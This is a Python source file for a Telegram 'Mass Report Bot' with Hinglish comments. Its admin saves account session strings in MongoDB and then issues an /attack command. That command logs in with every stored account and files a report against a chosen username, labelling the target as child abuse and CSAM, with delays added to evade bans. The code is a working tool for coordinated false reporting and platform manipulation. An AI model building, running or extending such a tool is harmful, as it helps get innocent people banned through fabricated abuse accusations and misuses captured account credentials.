import os
import asyncio
import logging
import pymongo
from dotenv import load_dotenv
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.messages import ReportRequest
from telethon.tl.types import InputReportReasonChildAbuse, InputReportReasonSpam
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# Setup
load_dotenv()
logging.basicConfig(level=logging.INFO)

# Configs
BOT_TOKEN = os.getenv('BOT_TOKEN')
API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
MONGO_URL = os.getenv('MONGO_URL')
ADMIN_ID = int(os.getenv('ADMIN_ID'))

# Database
client_db = pymongo.MongoClient(MONGO_URL)
db = client_db['mass_report_db']
sessions_col = db['sessions']

# --- COMMAND: /make_config [string_session] ---
async def make_config(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: `/make_config [STRING_SESSION]`")
        return

    session_str = context.args[0]
    try:
        # Session check karna
        temp_client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await temp_client.connect()
        if await temp_client.is_user_authorized():
            me = await temp_client.get_me()
            # Database mein save
            if not sessions_col.find_one({"session": session_str}):
                sessions_col.insert_one({"session": session_str, "user": me.first_name})
                await update.message.reply_text(f"✅ Session Saved: {me.first_name}")
            else:
                await update.message.reply_text("⚠️ Ye session pehle se added hai.")
        await temp_client.disconnect()
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

# --- COMMAND: /attack [Target_Username/Link] ---
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("❌ Usage: `/attack @target_username`")
        return

    target = context.args[0]
    all_sessions = list(sessions_col.find())
    total_acc = len(all_sessions)

    if total_acc == 0:
        await update.message.reply_text("❌ Pehle /make_config se sessions add karein!")
        return

    await update.message.reply_text(f"🚀 Attack Started on {target} using {total_acc} accounts...")

    success = 0
    for data in all_sessions:
        try:
            client = TelegramClient(StringSession(data['session']), API_ID, API_HASH)
            await client.connect()
            
            # Reporting Logic
            peer = await client.get_entity(target)
            await client(ReportRequest(
                peer=peer,
                id=[1], # Common report
                reason=InputReportReasonChildAbuse(),
                message="Reported for illegal activity and CSAM content."
            ))
            success += 1
            await client.disconnect()
            await asyncio.sleep(3) # Ban se bachne ke liye delay
        except Exception as e:
            logging.error(f"Failed session: {e}")
            continue

    await update.message.reply_text(f"🏁 Attack Finished!\n✅ Successful Reports: {success}/{total_acc}")

# --- COMMAND: /status ---
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    count = sessions_col.count_documents({})
    await update.message.reply_text(f"📊 Total Sessions in DB: {count}")

# Main Runner
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("make_config", make_config))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("status", status))
    print("Mass Report Bot is Running...")
    app.run_polling()

if __name__ == '__main__':
    main()
